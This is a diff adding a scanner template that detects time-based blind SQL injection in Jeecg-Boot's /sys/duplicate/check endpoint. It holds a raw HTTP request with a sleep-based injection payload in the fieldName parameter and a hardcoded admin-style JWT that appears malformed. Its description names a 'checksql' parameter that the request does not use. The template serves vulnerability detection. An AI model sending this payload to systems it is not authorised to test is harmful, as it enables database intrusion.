@@ -1,0 +1,31 @@
+id: jeecg-boot-sqlinjection
+
+info:
+  name: Jeecg-Boot SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    The /sys/duplicate/check endpoint in Jeecg-Boot is vulnerable to SQL injection, allowing attackers to exploit the `checksql` parameter.
+  tags: sqlinjection,jeecg-boot,authenticated
+
+http:
+  - raw:
+      - |
+        GET /jeecg-boot/sys/duplicate/check?tableName=v3_hello&fieldName=1+and%09if(user(%20)='root@localhost',sleep(5),sleep(0))&fieldVal=1&dataId=asd HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Accept-Language: en-US;q=0.9,en;q=0.8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36
+        Connection: close
+        Cache-Control: max-age=0
+        X_ACCESS_TOKEN: eyJ0eXAi0iJKV1QiLCJhbGci0iJIUzI1NiJ9.eyJleHAi0jE2NzA2NjUy0TQsInVzZXJ1YW1lIjoiYWRtaW4i fQ.bL0e7k3rbFEewdMoL2YfPCo9rtzx7g9KLjB2LK-J9SU
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - 'duration > 5000'
